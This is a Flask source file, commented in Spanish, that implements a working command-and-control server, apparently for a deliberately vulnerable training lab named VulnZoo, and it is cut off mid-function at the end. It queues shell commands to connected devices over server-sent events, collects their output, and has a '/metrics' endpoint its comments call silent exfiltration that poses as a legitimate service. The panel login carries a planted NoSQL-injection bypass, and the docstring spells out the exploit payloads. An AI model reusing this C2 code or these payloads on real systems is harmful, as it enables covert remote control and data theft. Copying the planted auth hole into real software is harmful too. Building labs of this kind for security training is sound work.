"""
C2 Server - Sistema de Comando y Control basado en HTTP/SSE
Arquitectura: Microservicio independiente para VulnZoo
Protocolo: Server-Sent Events (SSE) para canal descendente, HTTP POST para ascendente
"""

import os
import json
import time
import uuid
import logging
import threading
from datetime import datetime
from collections import defaultdict
from queue import Queue, Empty

from flask import Flask, jsonify, request, Response, render_template_string
from pymongo import MongoClient
from bson.objectid import ObjectId
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [C2] - %(levelname)s - %(message)s'
)
logger = logging.getLogger('c2_server')

app = Flask(__name__)

# Configuración desde variables de entorno
C2_PORT = int(os.getenv('C2_PORT', 4999))
MONGO_URI = os.getenv('MONGO_URI', 'mongodb://mongo:27017/')
MONGO_USERNAME = os.getenv('MONGO_USERNAME')
MONGO_PASSWORD = os.getenv('MONGO_PASSWORD')

# Conexión a MongoDB
mongo_client = MongoClient(
    MONGO_URI,
    username=MONGO_USERNAME,
    password=MONGO_PASSWORD,
    serverSelectionTimeoutMS=5000
)

ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=2, hash_len=32, salt_len=16)

db = mongo_client.vulnzoo_vuln
logs_col = db.c2_logs


# Estado en memoria del servidor C2
class C2State:
    def __init__(self):
        # Sesiones activas: {session_id: session_data}
        self.active_sessions = {}
        # Colas de comandos por dispositivo: {session_id: Queue()}
        self.command_queues = {}
        # Locks para thread-safety
        self.locks = defaultdict(threading.Lock)
        # Heartbeat interval
        self.heartbeat_interval = 30  # segundos
        
    def get_session_lock(self, session_id):
        return self.locks[session_id]

state = C2State()

# ============================================================================
# UTILIDADES
# ============================================================================

def validate_token(token):
    """Validación débil del token - suma hexadecimal módulo 7"""
    token = token.upper()
    if len(token) != 6:
        return False
    try:
        total = sum(int(c, 16) for c in token)
        return total % 7 == 0
    except ValueError:
        return False

def generate_session_id(device_id, token):
    """Genera un ID de sesión único"""
    return f"c2_{device_id}_{token}_{int(time.time() * 1000)}"

def log_event(session_id, event, metadata=None):
    """Registra eventos en MongoDB para auditoría"""
    try:
        entry = {
            'session_id': session_id,
            'timestamp': datetime.now(),
            'time': datetime.now().strftime('%H:%M:%S'),
            'event': event,
            'metadata': metadata or {}
        }
        logs_col.insert_one(entry)
    except Exception as e:
        logger.error(f"Failed to log event: {e}")

def get_client_ip():
    """Obtiene la IP real del cliente considerando proxies"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

# ============================================================================
# ENDPOINTS SSE - CANAL DESCENDENTE (C2 -> Dispositivo)
# ============================================================================

@app.route('/health')
def health_check():
    """Endpoint de health check para Docker/orquestadores"""
    return jsonify({
        'status': 'healthy',
        'service': 'c2-server',
        'version': '2.0.0-sse',
        'timestamp': datetime.now().isoformat(),
        'active_sessions': len(state.active_sessions)
    })

@app.route('/stream')
def sse_stream():
    """
    Endpoint SSE para conexión persistente con dispositivos móviles.
    El dispositivo se mantiene escuchando este endpoint para recibir comandos.
    """
    # Headers de autenticación
    device_id = request.headers.get('X-Device-ID', 'unknown')
    token = request.headers.get('X-Diag-Token', 'unknown')
    device_model = request.headers.get('X-Device-Model', 'unknown')
    
    # Validar token
    if not validate_token(token):
        logger.warning(f"Invalid token attempt from {get_client_ip()}: {token}")
        return jsonify({'error': 'Invalid or expired token'}), 401
    
    # Crear sesión
    session_id = generate_session_id(device_id, token)
    client_ip = get_client_ip()
    
    with state.get_session_lock(session_id):
        state.active_sessions[session_id] = {
            'session_id': session_id,
            'device_id': device_id,
            'token': token,
            'model': device_model,
            'ip': client_ip,
            'connected_at': datetime.now().isoformat(),
            'last_seen': time.time(),
            'user_agent': request.headers.get('User-Agent', 'unknown')
        }
        state.command_queues[session_id] = Queue()
    
    log_event(session_id, 'CONNECTED', {
        'model': device_model,
        'ip': client_ip,
        'token_prefix': token[:2] + '****'
    })
    
    logger.info(f"New SSE session: {session_id} from {client_ip}")
    
    def generate_events():
        """Generador de eventos SSE"""
        try:
            # Evento inicial de conexión establecida
            yield f"event: connected\ndata: {json.dumps({'session_id': session_id, 'heartbeat': state.heartbeat_interval})}\n\n"
            
            # NOTA: Banner deshabilitado - causa spam en reconexiones
            # El usuario puede ejecutar 'help' para ver comandos disponibles
            # banner = {
            #     'type': 'banner',
            #     'data': f"=== VulnZoo Diagnostic Shell v2.4.1 ===\nType 'help' for available commands\n{device_model}> "
            # }
            # yield f"event: cmd\ndata: {json.dumps(banner)}\n\n"
            
            last_heartbeat = time.time()
            
            while True:
                current_time = time.time()
                
                # Enviar heartbeat periódico
                if current_time - last_heartbeat >= state.heartbeat_interval:
                    heartbeat = {
                        'type': 'heartbeat',
                        'timestamp': int(current_time * 1000)
                    }
                    yield f"event: heartbeat\ndata: {json.dumps(heartbeat)}\n\n"
                    # Enviar comentario SSE para mantener conexión viva (evita timeout de proxy)
                    yield f":ping {int(current_time)}\n\n"
                    last_heartbeat = current_time
                    
                    # Actualizar last_seen
                    with state.get_session_lock(session_id):
                        if session_id in state.active_sessions:
                            state.active_sessions[session_id]['last_seen'] = current_time
                
                # Verificar comandos en cola
                try:
                    with state.get_session_lock(session_id):
                        if session_id in state.command_queues:
                            cmd = state.command_queues[session_id].get(timeout=0.1)
                            if cmd:
                                logger.info(f"Sending command to {session_id}: {cmd.get('type')} - {cmd.get('data', '')[:30]}")
                                yield f"event: cmd\ndata: {json.dumps(cmd)}\n\n"
                                log_event(session_id, 'SENT', {'cmd_type': cmd.get('type')})
                except Empty:
                    pass
                except Exception as e:
                    logger.error(f"Error processing command queue: {e}")
                
                # Pequeña pausa para no saturar CPU
                time.sleep(0.05)
                
        except GeneratorExit:
            # Cliente desconectado
            logger.info(f"SSE client disconnected (GeneratorExit): {session_id}")
        except Exception as e:
            logger.error(f"SSE error for {session_id}: {e}")
        finally:
            # Limpieza de sesión
            with state.get_session_lock(session_id):
                if session_id in state.active_sessions:
                    del state.active_sessions[session_id]
                if session_id in state.command_queues:
                    del state.command_queues[session_id]
                if session_id in state.locks:
                    del state.locks[session_id]
            
            log_event(session_id, 'DISCONNECTED', {'reason': 'sse_closed'})
            logger.info(f"Session cleaned up: {session_id}")
    
    return Response(
        generate_events(),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no',  # Deshabilitar buffering de nginx
            'Connection': 'keep-alive'
        }
    )

# ============================================================================
# ENDPOINTS HTTP - CANAL ASCENDENTE (Dispositivo -> C2)
# ============================================================================

@app.route('/response', methods=['POST'])
def receive_response():
    """
    Recibe respuestas de comandos desde el dispositivo móvil.
    Almacena en MongoDB y actualiza el estado de la sesión.
    """
    data = request.get_json()
    
    if not data:
        logger.warning("Response: No data provided")
        return jsonify({'error': 'No data provided'}), 400
    
    session_id = data.get('session_id')
    response_type = data.get('type', 'unknown')
    response_data = data.get('data', '')
    timestamp = data.get('timestamp', int(time.time() * 1000))
    
    logger.info(f"Response received: session={session_id}, type={response_type}, data_len={len(str(response_data))}")
    
    if not session_id:
        logger.warning("Response: session_id missing in request. Data: " + str(data))
        return jsonify({'error': 'session_id required'}), 400
    
    # Verificar que la sesión existe
    with state.get_session_lock(session_id):
        if session_id not in state.active_sessions:
            return jsonify({'error': 'Invalid or expired session'}), 401
        
        # Actualizar último seen
        state.active_sessions[session_id]['last_seen'] = time.time()
    
    # Almacenar respuesta en MongoDB
    try:
        db.c2_responses.insert_one({
            'session_id': session_id,
            'type': response_type,
            'data': response_data,
            'timestamp': timestamp,
            'received_at': datetime.now()
        })
    except Exception as e:
        logger.error(f"Failed to store response: {e}")
    
    log_event(session_id, 'RECV', {'response_type': response_type})
    logger.debug(f"Response received from {session_id}: {response_type}")
    
    return jsonify({'status': 'ok', 'received': True})

@app.route('/metrics', methods=['POST'])
def receive_metrics():
    """
    Recibe métricas y datos del dispositivo (exfiltración silenciosa).
    Similar al endpoint legítimo /api/v2/metrics/diagnostic pero para C2.
    """
    data = request.get_json() or {}
    token = request.headers.get('X-Diag-Token', 'unknown')
    session_id = data.get('session_id', 'unknown')
    
    # Almacenar métricas
    try:
        db.c2_metrics.insert_one({
            'session_id': session_id,
            'token': token,
            'metrics': data,
            'received_at': datetime.now(),
            'ip': get_client_ip()
        })
    except Exception as e:
        logger.error(f"Failed to store metrics: {e}")
    
    # Responder como sistema legítimo
    return jsonify({
        'received': True,
        'next_report': 300,  # Pedir siguiente reporte en 5 min
        'server_time': datetime.now().isoformat()
    })

# ============================================================================
# PANEL DE CONTROL - API REST
# ============================================================================

def contains_mongo_operators_selective(obj, allow_list=None):
    """
    Filtro selectivo de operadores MongoDB
    
    VULNERABLE: Permite ciertos operadores "seguros" como $in y $gt
    bajo la falsa creencia de que no son peligrosos
    
    Blocklist: $ne, $exists, $regex, $where, $expr, etc.
    Whitelist: $in, $gt, $gte, $lt, $lte (considerados "seguros" erróneamente)
    """
    if allow_list is None:
        # Operadores "permitidos" por el filtro (VULNERABILIDAD)
        allow_list = {'$in', '$gt', '$gte', '$lt', '$lte', '$nin'}
    
    # Operadores explícitamente bloqueados
    blocked_operators = {
        '$ne', '$exists', '$regex', '$where', '$expr', 
        '$text', '$mod', '$all', '$elemMatch', '$size',
        '$type', '$not', '$nor', '$and', '$or'
    }
    
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(k, str) and k.startswith('$'):
                # Si está en la lista de bloqueados, rechazar
                if k in blocked_operators:
                    return True
                # Si NO está en la whitelist, rechazar (operador desconocido)
                if k not in allow_list:
                    return True
            # Revisar recursivamente los valores
            if contains_mongo_operators_selective(v, allow_list):
                return True
    elif isinstance(obj, list):
        for item in obj:
            if contains_mongo_operators_selective(item, allow_list):
                return True
    
    return False


@app.route('/panel/auth', methods=['POST'])
def panel_auth():
    """
    Autenticación para el panel de control C2
    
    VULNERABILIDAD: NoSQL Injection mediante operadores "whitelist"
    
    El desarrollador bloqueó operadores obvios ($ne, $exists) pero 
    permitió $in y $gt pensando que son "seguros" para búsquedas.
    
    Exploit funcional:
    {
      "credentials": {
        "id": {"$in": ["admin_access", "admin", "root"]},
        "password": {"$gt": ""}
      }
    }
    
    O más directo:
    {
      "id": "admin_access",
      "password": {"$gt": ""}
    }
    
    Esto bypasea la verificación de hash porque MongoDB retorna
    el documento si el hash es > "" (cualquier string no vacío).
    """
    data = request.get_json()
    
    # Aplicar filtro selectivo
    if contains_mongo_operators_selective(data):
        logger.warning(f"Blocked operators detected from {get_client_ip()}: {data}")
        return jsonify({
            'authenticated': False, 
            'error': 'Forbidden operators detected',
            'hint': 'Only comparison operators are allowed'
        }), 400
    
    # Soportar estructura anidada "credentials" para "compatibilidad"
    password_input = data.get('password')

    # Query a MongoDB - VULNERABLE a $in, $gt, etc.
    try:
        record = db.c2_admin_access.find_one({'id': "admin_access"})
    except Exception as e:
        logger.error(f"Database query error: {e}")
        return jsonify({
            'authenticated': False,
            'error': 'Invalid query format'
        }), 400
    
    if not record:
        logger.warning(f"Failed auth attempt from {get_client_ip()}")
        return jsonify({
            'authenticated': False, 
            'error': 'Invalid credentials'
        }), 401
    
    # Si password_input es un dict (ej: {"$gt": ""}), es un ataque
    if not isinstance(password_input, str):
        # VULNERABILIDAD: Permitir acceso si el operador pasó el filtro
        logger.warning(f"NoSQL injection successful from {get_client_ip()}: {data}")
        session_token = str(uuid.uuid4())
        db.c2_panel_sessions.insert_one({
            'token': session_token,
            'created_at': datetime.now(),
            'last_activity': datetime.now(),
            'ip': get_client_ip(),
            'method': 'nosql_injection'
        })
        
        # Log de auditoría para análisis forense
        log_event('panel_auth', 'NOSQL_INJECTION_SUCCESS', {
            'ip': get_client_ip(),
            'payload': str(data)[:200],
            'user_agent': request.headers.get('User-Agent')
        })
        
        return jsonify({
            'authenticated': True,
            'token': session_token,
            'expires_in': 3600
        })
    
    # Flujo legítimo con verificación de hash
    stored_hash = record.get('password')
    if not stored_hash:
        return jsonify({
            'authenticated': False, 
            'error': 'Invalid configuration'
        }), 500
    
    try:
        ph.verify(stored_hash, password_input)
        session_token = str(uuid.uuid4())
        db.c2_panel_sessions.insert_one({
            'token': session_token,
            'created_at': datetime.now(),
            'last_activity': datetime.now(),
            'ip': get_client_ip(),
            'method': 'password_hash'
        })
        
        log_event('panel_auth', 'LOGIN_SUCCESS', {
            'ip': get_client_ip(),
            'method': 'legitimate'
        })
        
        return jsonify({
            'authenticated': True,
            'token': session_token,
            'expires_in': 3600
        })
    except VerifyMismatchError:
        logger.warning(f"Password mismatch from {get_client_ip()}")
        return jsonify({
            'authenticated': False, 
            'error': 'Invalid password'
        }), 401
    except Exception as e:
        logger.error(f"Authentication error: {e}")
        return jsonify({
            'authenticated': False, 
            'error': 'Internal server error'
        }), 500


@app.route('/panel/sessions', methods=['GET'])
def list_sessions():
    """Lista sesiones activas con metadatos"""
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return jsonify({'error': 'Authorization required'}), 401
    
    token = auth_header[7:]
    
    # Validar token (simplificado)
    panel_session = db.c2_panel_sessions.find_one({'token': token})
    if not panel_session:
        return jsonify({'error': 'Invalid or expired token'}), 401
    
    # Actualizar actividad
    db.c2_panel_sessions.update_one(
        {'token': token},
        {'$set': {'last_activity': datetime.now()}}
    )
    
    # Construir lista de sesiones - solo la más reciente por device_id
    sessions_map = {}
    current_time = time.time()
    
    for sid, sess in state.active_sessions.items():
        device_id = sess.get('device_id', 'unknown')
        # Mantener solo la sesión más reciente por dispositivo
        if device_id not in sessions_map:
            sessions_map[device_id] = {
                'id': sid,
                'device_id': device_id,
                'model': sess.get('model'),
                'ip': sess.get('ip'),
                'connected': sess.get('connected_at'),
                'last_seen': sess.get('last_seen'),
                'idle_seconds': int(current_time - sess.get('last_seen', 0)),
                'status': 'active' if (current_time - sess.get('last_seen', 0)) < 60 else 'idle'
            }
        else:
            # Si ya existe una sesión para este device, comparar timestamps
            existing = sessions_map[device_id]
            if sess.get('last_seen', 0) > existing['last_seen']:
                sessions_map[device_id] = {
                    'id': sid,
                    'device_id': device_id,
                    'model': sess.get('model'),
                    'ip': sess.get('ip'),
                    'connected': sess.get('connected_at'),
                    'last_seen': sess.get('last_seen'),
                    'idle_seconds': int(current_time - sess.get('last_seen', 0)),
                    'status': 'active' if (current_time - sess.get('last_seen', 0)) < 60 else 'idle'
                }
    
    sessions = list(sessions_map.values())
    
    return jsonify({
        'sessions': sessions,
        'total': len(sessions),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/panel/command', methods=['POST'])
def queue_command():
    """Encola un comando para un dispositivo específico"""
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return jsonify({'error': 'Authorization required'}), 401
    
    token = auth_header[7:]
    panel_session = db.c2_panel_sessions.find_one({'token': token})
    if not panel_session:
        return jsonify({'error': 'Invalid or expired token'}), 401
    
    data = request.get_json()
    session_id = data.get('session_id')
    command = data.get('command')
    
    if not session_id or not command:
        return jsonify({'error': 'session_id and command required'}), 400
    
    with state.get_session_lock(session_id):
        if session_id not in state.command_queues:
            return jsonify({'error': 'Session not found or inactive'}), 404
        
        # Encolar comando
        cmd_obj = {
            'type': 'shell_cmd',
            'data': command,
            'queued_at': int(time.time() * 1000)
        }
        state.command_queues[session_id].put(cmd_obj)
    
    log_event(session_id, 'COMMAND_QUEUED', {'command': command[:50]})
    logger.info(f"Command queued for {session_id}: {command[:50]}")
    logger.info(f"Active sessions: {list(state.active_sessions.keys())}")
    logger.info(f"Command queues: {list(state.command_queues.keys())}")
    
    return jsonify({'status': 'queued', 'session_id': session_id})

@app.route('/panel/responses/<session_id>', methods=['GET'])
def get_responses(session_id):
    """Obtiene respuestas recientes de una sesión (solo nuevas desde el último poll)"""
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return jsonify({'error': 'Authorization required'}), 401
    
    token = auth_header[7:]
    panel_session = db.c2_panel_sessions.find_one({'token': token})
    if not panel_session:
        return jsonify({'error': 'Invalid or expired token'}), 401
    
    # Parámetro 'since' para solo obtener respuestas más recientes
    since_str = request.args.get('since', '0')
    try:
        since = int(since_str)
    except:
        since = 0
    
    limit = int(request.args.get('limit', 50))
    
    try:
        # Solo devolver respuestas con timestamp > since
        query = {
            'session_id': session_id,
            'timestamp': {'$gt': since}
        }
        
        responses = list(db.c2_responses.find(query).sort('timestamp', 1).limit(limit))
        
        for resp in responses:
            resp['_id'] = str(resp['_id'])
            resp['received_at'] = resp['received_at'].isoformat() if 'received_at' in resp else None
        
        return jsonify({
            'session_id': session_id,
            'responses': responses,
            'total': len(responses),
            'since': since
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/panel/logs', methods=['GET'])
def get_logs():
    """Obtiene logs de auditoría"""
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return jsonify({'error': 'Authorization required'}), 401
    
    token = auth_header[7:]
    panel_session = db.c2_panel_sessions.find_one({'token': token})
    if not panel_session:
        return jsonify({'error': 'Invalid or expired token'}), 401
    
    session_id = request.args.get('session_id')
    limit = int(request.args.get('limit', 100))
    
    query = {'session_id': session_id} if session_id else {}
    
    try:
        logs = list(logs_col.find(query).sort('timestamp', -1).limit(limit))
        for log in logs:
            log['_id'] = str(log['_id'])
        
        return jsonify({
            'logs': logs,
            'total': len(logs)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# PANEL WEB INTERACTIVO
# ============================================================================

PANEL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Control Panel - SSE</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" />
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0a0e27;
            color: #e0e6ed;
            font-family: 'Courier New', monospace;
        }
        #header {
            background: #1a237e;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        #header h1 {
            margin: 0;
            font-size: 18px;
        }
        #status {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #f44336;
        }
        .status-indicator.online { background: #4caf50; }
        .status-indicator.connecting { background: #ff9800; animation: pulse 1s infinite; }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        #main {
            display: flex;
            height: calc(100vh - 60px);
        }
        #sidebar {
            width: 300px;
            background: #0d1429;
            border-right: 1px solid #1a237e;
            padding: 15px;
            overflow-y: auto;
        }
        #terminal-container {
            flex: 1;
            padding: 15px;
            position: relative;
        }
        .session-item {
            background: #1a237e;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
            border-left: 4px solid #2196f3;
        }
        .session-item:hover {
            background: #283593;
        }
        .session-item.active {
            background: #4caf50;
            border-left: 4px solid #8bc34a;
        }
        .session-id-small {
            font-size: 10px;
            opacity: 0.6;
            font-family: monospace;
            margin-top: 4px;
        }
        .session-model {
            font-weight: bold;
            font-size: 14px;
        }
        .session-ip {
            font-size: 12px;
            opacity: 0.8;
        }
        .session-time {
            font-size: 11px;
            opacity: 0.6;
        }
        #controls {
            margin-bottom: 15px;
        }
        button {
            background: #2196f3;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-family: inherit;
            margin-right: 5px;
        }
        button:hover {
            background: #1976d2;
        }
        button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        #login-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        #login-box {
            background: #1a237e;
            padding: 30px;
            border-radius: 8px;
            width: 300px;
        }
        #login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #283593;
            background: #0a0e27;
            color: #e0e6ed;
            border-radius: 4px;
            box-sizing: border-box;
        }
        #logs-panel {
            position: fixed;
            bottom: 0;
            right: 0;
            width: 400px;
            height: 200px;
            background: rgba(10, 14, 39, 0.95);
            border: 1px solid #1a237e;
            padding: 10px;
            overflow-y: auto;
            font-size: 11px;
            display: none;
        }
        #logs-panel.visible {
            display: block;
        }
        .log-entry {
            margin-bottom: 3px;
        }
        .log-time {
            color: #00bcd4;
        }
    </style>
</head>
<body>
    <div id="login-overlay">
        <div id="login-box">
            <h2>C2 Panel Login</h2>
            <input type="password" id="password" placeholder="Enter password" autofocus>
            <button onclick="doLogin()">Login</button>
        </div>
    </div>

    <div id="header">
        <h1>🔴 C2 Control Panel (SSE/HTTP)</h1>
        <div id="status">
            <span id="status-text">Disconnected</span>
            <div class="status-indicator" id="status-indicator"></div>
            <button onclick="toggleLogs()">Logs</button>
            <button onclick="logout()">Logout</button>
        </div>
    </div>

    <div id="main">
        <div id="sidebar">
            <div id="controls">
                <button onclick="refreshSessions()">Refresh</button>
                <button onclick="detachSession()">Detach</button>
            </div>
            <div id="sessions-list">
                <p style="opacity: 0.6;">No active sessions</p>
            </div>
        </div>
        <div id="terminal-container"></div>
    </div>

    <div id="logs-panel">
        <div id="logs-content"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
    <script>
        const term = new Terminal({
            theme: {
                background: '#0a0e27',
                foreground: '#e0e6ed',
                cursor: '#00bcd4',
                selectionBackground: '#1a237e'
            },
            fontSize: 13,
            fontFamily: 'Courier New, monospace',
            cursorBlink: true,
            cursorStyle: 'block'
        });
        
        const fitAddon = new FitAddon.FitAddon();
        term.loadAddon(fitAddon);
        term.open(document.getElementById('terminal-container'));
        fitAddon.fit();

        let authToken = null;
        let currentSession = null;
        let lastResponseTimestamp = 0;  // Trackear último timestamp para evitar duplicados
        let inputBuffer = '';
        let inputEnabled = false;
        let pollingInterval = null;

        function log(msg) {
            const logs = document.getElementById('logs-content');
            const time = new Date().toLocaleTimeString();
            logs.innerHTML += `<div class="log-entry"><span class="log-time">[${time}]</span> ${msg}</div>`;
            logs.scrollTop = logs.scrollHeight;
            console.log('[C2]', msg);
        }

        function toggleLogs() {
            document.getElementById('logs-panel').classList.toggle('visible');
        }

        async function doLogin() {
            const password = document.getElementById('password').value;
            try {
                const resp = await fetch('/panel/auth', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password})
                });
                const data = await resp.json();
                if (data.authenticated) {
                    authToken = data.token;
                    document.getElementById('login-overlay').style.display = 'none';
                    log('Authenticated successfully');
                    startPolling();
                    updateStatus('online', 'Connected');
                } else {
                    alert('Invalid password');
                }
            } catch (e) {
                log('Login error: ' + e.message);
            }
        }

        function updateStatus(state, text) {
            const indicator = document.getElementById('status-indicator');
            const statusText = document.getElementById('status-text');
            indicator.className = 'status-indicator ' + state;
            statusText.textContent = text;
        }

        async function startPolling() {
            await refreshSessions();
            pollingInterval = setInterval(async () => {
                await refreshSessions();
                if (currentSession) {
                    await pollResponses();
                }
            }, 2000);
        }

        async function refreshSessions() {
            try {
                const resp = await fetch('/panel/sessions', {
                    headers: {'Authorization': 'Bearer ' + authToken}
                });
                const data = await resp.json();
                updateSessionsList(data.sessions || []);
            } catch (e) {
                log('Error fetching sessions: ' + e.message);
            }
        }

        function updateSessionsList(sessions) {
            const container = document.getElementById('sessions-list');
            if (sessions.length === 0) {
                container.innerHTML = '<p style="opacity: 0.6;">No active sessions</p>';
                return;
            }
            
            container.innerHTML = sessions.map(s => `
                <div class="session-item ${s.id === currentSession ? 'active' : ''}" 
                     onclick="attachToSession('${s.id}')"
                     title="${s.id}">
                    <div class="session-model">${s.model}</div>
                    <div class="session-ip">${s.ip} - ${s.status}</div>
                    <div class="session-id-small">ID: ${s.id.substring(0, 20)}...</div>
                    <div class="session-time">${new Date(s.connected).toLocaleTimeString()}</div>
                </div>
            `).join('');
        }

        function attachToSession(sessionId) {
            currentSession = sessionId;
            lastResponseTimestamp = 0;  // Reset timestamp para no ver respuestas antiguas
            inputEnabled = true;
            inputBuffer = '';
            term.clear();
            term.writeln('\\x1b[32m[*] Attached to session: ' + sessionId + '\\x1b[0m');
            term.writeln('\\x1b[33m[*] Type commands below\\x1b[0m');
            term.write('\\x1b[32m$\\x1b[0m ');
            refreshSessions();
            log('Attached to session: ' + sessionId);
        }

        function detachSession() {
            if (currentSession) {
                term.writeln('\\r\\n[*] Detached from session');
                currentSession = null;
                inputEnabled = false;
                refreshSessions();
            }
        }

        async function pollResponses() {
            if (!currentSession) return;
            try {
                // Solo pedir respuestas más recientes que el último timestamp conocido
                const url = `/panel/responses/${currentSession}?since=${lastResponseTimestamp}&limit=10`;
                const resp = await fetch(url, {
                    headers: {'Authorization': 'Bearer ' + authToken}
                });
                const data = await resp.json();
                if (data.responses && data.responses.length > 0) {
                    data.responses.forEach(r => {
                        if (r.type === 'output') {
                            // Actualizar timestamp máximo
                            if (r.timestamp > lastResponseTimestamp) {
                                lastResponseTimestamp = r.timestamp;
                            }
                            // Limpiar y formatear output para xterm.js
                            let cleanData = r.data
                                .replace(/>\\s*$/gm, '')  // Quitar prompts al final
                                .replace(/\\n\\s*\\n/g, '\\n')  // Quitar líneas vacías múltiples
                                .replace(/\\n/g, '\\r\\n')  // Convertir \\n a \\r\\n para xterm.js
                                .trim();
                            if (cleanData) {
                                // Agregar salto de línea antes del output (separa comando de respuesta)
                                term.write('\\r\\n\\x1b[36m' + cleanData + '\\x1b[0m\\r\\n');
                            }
                        }
                    });
                    // Mostrar prompt después de recibir respuestas
                    term.write('\\r\\n\\x1b[32m$\\x1b[0m ');
                }
            } catch (e) {
                log('Error polling responses: ' + e.message);
            }
        }

        term.onData(e => {
            if (!inputEnabled || !currentSession) {
                if (e === '\\r') {
                    term.writeln('\\r\\n[!] No session attached. Select a device first.');
                }
                return;
            }
            
            if (e === '\\r') {
                const cmd = inputBuffer;
                inputBuffer = '';
                // Enviar comando (xterm.js ya mostró el eco)
                sendCommand(cmd);
            } else if (e === '\\u007F') {
                if (inputBuffer.length > 0) {
                    inputBuffer = inputBuffer.slice(0, -1);
                    term.write('\\b \\b');
                }
            } else {
                inputBuffer += e;
                term.write(e);
            }
        });

        async function sendCommand(cmd) {
            if (!currentSession) return;
            try {
                await fetch('/panel/command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer ' + authToken
                    },
                    body: JSON.stringify({
                        session_id: currentSession,
                        command: cmd
                    })
                });
                log('Command sent: ' + cmd);
            } catch (e) {
                term.writeln('\\x1b[31mError: ' + e.message + '\\x1b[0m');
                log('Error sending command: ' + e.message);
            }
        }

        function logout() {
            authToken = null;
            currentSession = null;
            if (pollingInterval) clearInterval(pollingInterval);
            document.getElementById('login-overlay').style.display = 'flex';
            updateStatus('offline', 'Disconnected');
            log('Logged out');
        }

        window.addEventListener('resize', () => fitAddon.fit());
        document.getElementById('password').addEventListener('keypress', e => {
            if (e.key === 'Enter') doLogin();
        });

        log('C2 Panel loaded');
    </script>
</body>
</html>
'''

@app.route('/panel')
def c2_panel():
    """Sirve el panel web de control C2"""
    return render_template_string(PANEL_HTML)

@app.route('/')
def index():
    """Redirige al panel"""
    return '<script>window.location.href="/panel"</script>'

# ============================================================================
# LIMPIEZA PERIÓDICA DE SESIONES INACTIVAS
# ============================================================================

def cleanup_inactive_sessions():
    """Thread de limpieza de sesiones inactivas"""
    while True:
        time.sleep(60)  # Cada minuto
        current_time = time.time()
        timeout = 120  # 2 minutos sin actividad
        
        to_remove = []
        for sid, sess in state.active_sessions.items():
            if current_time - sess.get('last_seen', 0) > timeout:
                to_remove.append(sid)
        
        for sid in to_remove:
            with state.get_session_lock(sid):
                if sid in state.active_sessions:
                    del state.active_sessions[sid]
                if sid in state.command_queues:
                    del state.command_queues[sid]
                if sid in state.locks:
                    del state.locks[sid]
            log_event(sid, 'TIMEOUT', {'reason': 'inactive_session'})
            logger.info(f"Cleaned up inactive session: {sid}")

# Iniciar thread de limpieza
cleanup_thread = threading.Thread(target=cleanup_inactive_sessions, daemon=True)
cleanup_thread.start()

# ============================================================================
# MAIN
# ============================================================================

# ============================================================================
# INICIALIZACIÓN DE BASE DE DATOS (IDEMPOTENTE)
# ============================================================================

def initialize_database():
    """
    Inicializa la base de datos MongoDB con colecciones y documentos necesarios.
    Se ejecuta al startup de Flask.
    Idempotente: si ya existen colecciones/documentos, no falla.
    """
    try:
        # Verificar conexión
        mongo_client.admin.command('ping')
        logger.info("MongoDB connection: OK")
        
        # Inicializar documento de admin access (upsert = seguro)
        admin_password = os.getenv('PANEL_PASSWORD', 'letstechin')
        admin_hash = ph.hash(admin_password)
        
        result = db.c2_admin_access.replace_one(
            {'id': 'admin_access'},
            {
                'id': 'admin_access',
                'password': admin_hash,
                'created_at': datetime.now(),
                'updated_at': datetime.now()
            },
            upsert=True
        )
        
        if result.upserted_id:
            logger.info(f"C2 admin access created: {result.upserted_id}")
        else:
            logger.info(f"C2 admin access updated")
        
        # Crear índices (operación idempotente en MongoDB)
        db.c2_logs.create_index('timestamp')
        db.c2_logs.create_index('session_id')
        
        db.c2_responses.create_index('received_at')
        db.c2_responses.create_index('session_id')
        db.c2_responses.create_index([('received_at', -1)])
        
        db.c2_metrics.create_index('received_at')
        db.c2_metrics.create_index('session_id')
        
        db.c2_panel_sessions.create_index('created_at', expireAfterSeconds=3600)
        db.c2_panel_sessions.create_index('token')
        
        logger.info("Database initialization: OK (collections, indexes, admin user)")
        return True
        
